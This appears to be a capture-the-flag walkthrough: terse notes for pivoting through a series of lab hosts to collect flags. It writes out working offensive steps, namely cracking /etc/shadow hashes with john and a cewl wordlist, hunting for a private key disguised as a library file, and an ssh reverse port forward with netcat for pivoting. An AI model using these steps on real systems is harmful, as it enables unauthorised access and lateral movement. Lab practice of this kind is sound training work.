gotty > student@c2t2-000-bchd

  STEPS:
    0. find a throw away flag (first) 
       grep COG *.txt
    1. find the port 1863 in (ss or netstat for outbound ssh connections on the port)
       - watch -n1 -d ss -antp
       - tcpdump -i ens3 not port 2222 and ip
    2. run john on the etc passwd to get the axel user's password
       "There sure are a lot of WORDS in this book.  Make sure to not PASS your eyes over all of them"
       - make a wordlist from heimskringla.txt
         sudo apt install cewl john
         python -m SimpleHTTPServer &
         cewl localhost:8000/heimskringla.txt -w words
         sudo john --wordlist=words /etc/shadow
         # HINT: only do the hash you want (avoid 656000 rounds on the student user)
    3. find the hostname crust 
       nslookip <IP from ss -ant>
    4. ssh to axel@c2t2-000-crust -p 1863

axel@crust

  STEPS:
    1. find the PEM private key file burried on the crust server 
       find / -type f  2>/dev/null | grep ".so$" | xargs -I {} -P0 file {} | egrep -v "ELF|ASCII|python|terminfo"
       ssh-keygen -l -f <FILE> 
    2. watch the syslog that is running on crust
       a. cat flag into the log every 5 min (cron?) -> key is there and also failed attempts to connect to port
    3. use that key to get to lindenbrock@mantle -> no bash just a key 

lindenbrock@mantle

  STEPS:
    0. no shell here -- But GatewayPorts yes 
    1. port forward 1337 reverse to netcat to recieve a flag and a clue for how to get to core (BONUS wireguard?)
       ssh lindenbrock@c2t2-001-mantle -i /usr/lib/x86_64-linux-gnu/coreutils/libstdkey.so -NT -R 0.0.0.0:1337:localhost:1337 -v
    3. Forward tunnel to core 

stromboli@core

  STEPS:
    0. play game
